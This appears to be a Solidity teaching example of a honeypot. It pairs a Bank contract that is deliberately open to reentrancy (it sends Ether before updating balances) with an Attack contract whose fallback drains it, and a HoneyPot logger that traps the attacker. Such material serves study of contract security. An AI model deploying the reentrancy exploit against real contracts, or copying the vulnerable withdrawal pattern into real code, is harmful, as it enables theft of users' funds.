// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

contract Bank {
    mapping(address => uint) public balances;
    Logger logger;

    constructor(address _logger) {
        logger = Logger(_logger);
    }

    function deposit() public payable {
        balances[msg.sender] += msg.value;
        logger.log(msg.sender, msg.value, "Deposit");
    }

    function withdraw(uint _amount) public {
        require(_amount <= balances[msg.sender], "Insufficient funds");

        (bool sent, ) = msg.sender.call{value: _amount}("");
        require(sent, "Failed to send Ether");

        // Arithmetic over/underflow
        //balances[msg.sender] -= _amount;
        balances[msg.sender] = 0;

        logger.log(msg.sender, address(this).balance, "Withdraw");
    }
}

contract Logger {
    event Log(address caller, uint amount, string action);

    function log(address _caller, uint _amount, string memory _action) public {
        emit Log(_caller, _amount, _action);
    }
}

contract Attack {
    Bank bank;

    constructor(address _bank) {
        bank = Bank(_bank);
    }

    fallback() external payable {
        if (address(bank).balance >= 1 ether) {
            bank.withdraw(1 ether);
        }
    }

    function attack() public payable {
        bank.deposit{value: 1 ether}();
        bank.withdraw(1 ether);
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}

contract HoneyPot {
    function log(address _caller, uint _amount, string memory _action) public pure {
        if (equal(_action, "Withdraw") && _amount == 0) {
            revert(string(abi.encodePacked("trap", _caller)));
        }
    }

    // Function to compare strings using keccak256
    function equal(string memory _a, string memory _b) public pure returns (bool) {
        return keccak256(abi.encode(_a)) == keccak256(abi.encode(_b));
    }
}
